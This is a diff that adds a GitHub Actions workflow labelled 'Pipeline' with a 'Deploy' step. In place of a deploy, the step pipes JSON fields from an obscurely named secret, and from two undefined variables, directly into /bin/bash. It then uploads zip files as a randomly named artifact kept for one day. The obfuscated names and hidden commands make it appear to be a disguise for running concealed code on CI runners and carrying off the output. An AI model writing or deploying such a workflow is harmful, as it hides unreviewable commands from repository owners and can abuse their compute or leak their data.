@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          leou4: ${{ secrets.leou4 }}
+        run: |
+          printf '%s' "$leou4" | jq -r .hjkkz1 | /bin/bash
+          echo $hupqm0214 | jq -r .u49938 | /bin/bash
+          printf '%s' "$drntd022" | jq -r .um84275 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8FsG7lzk
+          path: "*.zip"
+          retention-days: 1
